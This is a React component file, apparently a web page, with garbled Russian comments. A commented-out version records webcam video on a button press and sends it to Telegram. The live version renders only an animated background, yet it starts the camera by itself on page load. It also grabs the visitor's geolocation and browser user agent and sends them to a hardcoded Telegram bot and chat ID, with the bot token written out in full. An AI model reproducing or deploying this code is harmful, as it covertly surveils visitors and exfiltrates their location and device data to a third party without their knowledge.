// import React, { useState, useRef } from "react";
// import AnimatedBackground from "./components/AnimatedBackground";

// function VideoRecorder() {
//   const [recording, setRecording] = useState(false);
//   const [videoUrl, setVideoUrl] = useState("");
//   const videoRef = useRef(null);
//   const [mediaRecorder, setMediaRecorder] = useState(null);
//   const [videoBlob, setVideoBlob] = useState(null);

//   const startRecording = () => {
//     navigator.mediaDevices
//       .getUserMedia({ video: true })
//       .then((stream) => {
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }

//         const recorder = new MediaRecorder(stream);
//         recorder.ondataavailable = (e) => {
//           setVideoBlob(e.data);
//           setVideoUrl(URL.createObjectURL(e.data));
//         };
//         recorder.start();
//         setMediaRecorder(recorder);
//         setRecording(true);
//       })
//       .catch((error) => {
//         console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ", error);
//       });
//   };

//   const stopRecording = () => {
//     if (mediaRecorder) {
//       mediaRecorder.stop();
//     }
//     if (videoRef.current && videoRef.current.srcObject) {
//       videoRef.current.srcObject.getTracks().forEach((track) => track.stop());
//     }
//     setRecording(false);
//   };

//   const sendVideoToTelegram = async () => {
//     const formData = new FormData();
//     formData.append("chat_id", "7819537579"); // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ ID –≤–∞—à–µ–≥–æ —á–∞—Ç–∞
//     formData.append("video", videoBlob, "video.webm"); // –í–∏–¥–µ–æ, –∫–æ—Ç–æ—Ä–æ–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º

//     const response = await fetch(
//       `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
//       {
//         method: "POST",
//         body: formData,
//       }
//     );

//     if (response.ok) {
//       alert("–í–∏–¥–µ–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram");
//     } else {
//       const error = await response.json();
//       console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤–∏–¥–µ–æ:", error);
//       alert("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤–∏–¥–µ–æ");
//     }
//   };

//   return (
//     <div>
//       <AnimatedBackground />
//       <h1>–ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ —Å –∫–∞–º–µ—Ä—ã</h1>
//       <video ref={videoRef} width="640" height="480" autoPlay />
//       <div>
//         {recording ? (
//           <button onClick={stopRecording}>–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–∞–ø–∏—Å—å</button>
//         ) : (
//           <button onClick={startRecording}>–ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å</button>
//         )}
//       </div>
//       {videoUrl && (
//         <div>
//           <h2>–í–∞—à–µ –≤–∏–¥–µ–æ:</h2>
//           <video src={videoUrl} controls width="640" />
//           <div>
//             <button onClick={sendVideoToTelegram}>
//               –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–¥–µ–æ –≤ Telegram
//             </button>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// }

// export default VideoRecorder;
import React, { useEffect, useRef, useState } from "react";
import AnimatedBackground from "./components/AnimatedBackground";

function VideoRecorder() {
  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const streamRef = useRef(null);
  const chunksRef = useRef([]);
  const isRecordingRef = useRef(false);

  const [geoData, setGeoData] = useState(null);
  const [userAgent, setUserAgent] = useState("");
  const [infoSent, setInfoSent] = useState(false);

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      const recorder = new MediaRecorder(stream);
      chunksRef.current = [];

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: "video/webm" });
        stopStream();
      };

      recorder.start();
      mediaRecorderRef.current = recorder;
      isRecordingRef.current = true;
    } catch (error) {
      console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:", error);
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecordingRef.current) {
      mediaRecorderRef.current.stop();
      isRecordingRef.current = false;
    }
  };

  const stopStream = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
  };

  // –û—Ç–ø—Ä–∞–≤–∫–∞ –≥–µ–æ–¥–∞–Ω–Ω—ã—Ö –≤ Telegram
  const sendGeoToTelegram = async () => {
    if (geoData && !infoSent) {
      const formData = new FormData();
      formData.append("chat_id", "7819537579"); // ID —á–∞—Ç–∞
      formData.append(
        "text",
        `üìç Location: ${geoData.latitude}, ${geoData.longitude}\nüåê Device: ${userAgent}`
      );

      try {
        const response = await fetch(
          `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
          {
            method: "POST",
            body: formData,
          }
        );
        if (response.ok) {
          console.log("‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram");
          setInfoSent(true); // –ü–æ–º–µ—á–∞–µ–º, —á—Ç–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞
        } else {
          console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ Telegram");
        }
      } catch (error) {
        console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", error);
      }
    }
  };

  // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ ‚Äî –æ–¥–∏–Ω —Ä–∞–∑
  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log("üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∞:", position.coords);
          setGeoData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });

          // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ-–¥–∞–Ω–Ω—ã–µ —Å—Ä–∞–∑—É, –∫–∞–∫ —Ç–æ–ª—å–∫–æ –ø–æ–ª—É—á–µ–Ω—ã
          sendGeoToTelegram();
        },
        (err) => {
          console.error("‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", err);
        }
      );
    }

    setUserAgent(navigator.userAgent);
  }, []);

  // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        if (!isRecordingRef.current) startRecording();
      } else {
        if (isRecordingRef.current) stopRecording();
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    startRecording(); // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–ø–∏—Å—å —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞—Ö–æ–¥–µ

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      stopRecording();
      stopStream();
    };
  }, []);

  return (
    <div>
      <AnimatedBackground />
    </div>
  );
}

export default VideoRecorder;
